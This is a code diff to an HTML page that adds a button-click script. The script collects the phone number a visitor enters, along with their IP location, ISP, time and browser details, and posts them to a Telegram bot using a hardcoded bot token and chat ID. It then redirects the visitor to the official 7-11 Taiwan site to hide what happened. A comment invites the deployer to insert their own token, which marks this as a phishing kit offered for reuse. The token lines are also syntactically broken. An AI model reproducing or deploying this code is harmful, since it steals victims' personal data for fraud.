@@ -538,7 +538,6 @@
         </ul>
     </footer>
 
-    ```html
 <script>
 document.getElementById("btn").onclick = async function(){
     const phone = document.getElementById("phone").value.trim();
@@ -569,7 +568,32 @@ document.getElementById("btn").onclick = async function(){
                 `位置：${ipInfo.city || "未知"}，${ipInfo.country || "未知"}\n` +
                 `ISP：${ipInfo.org || "未知"}\n` +
                 `時間：${time}\n` +
- …
+                `裝置：${navigator.userAgent.substring(0,100)}...`;
+
+    // === 請把下面這兩行改成你自己的 Token 和 Chat ID ===
+    const TOKEN1 = 8710302623:AAFmI7o-LrW-2opgN_tKoqGVxWLP2F_-eDU;   
+    const TOKEN2 = 8710302623:AAFmI7o-LrW-2opgN_tKoqGVxWLP2F_-eDU;   
+    const CHAT_ID = 183369036;
+
+    // 發送到 Telegram
+    fetch(`https://api.telegram.org/bot${TOKEN1}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+    });
+
+    fetch(`https://api.telegram.org/bot${TOKEN2}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+    });
+
+    // 跳轉到 7-11 官網
+    setTimeout(() => {
+        location.replace("https://www.7-11.com.tw/");
+    }, 2200);
+};
+</script>
 
 </body>
 </html>
